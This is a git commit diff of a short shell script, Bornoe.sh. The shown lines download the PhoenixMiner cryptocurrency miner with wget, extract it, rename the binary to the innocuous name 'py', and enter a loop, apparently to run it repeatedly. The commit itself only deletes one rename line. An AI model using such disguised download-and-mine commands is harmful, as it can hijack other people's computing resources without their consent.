1ab4888a94671acd1192e19a2723d7fbf92d5013
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-08-15 09:15:14 -0600

    Update Bornoe.sh

--- Bornoe.sh
+++ Bornoe.sh
@@ -5,7 +5,6 @@ mkdir neo
 cd neo
 wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
 tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux
-mv PhoenixMiner_5.6d_Linux norm && cd norm
 mv PhoenixMiner py
 while [ $x -le 20 ]
 do
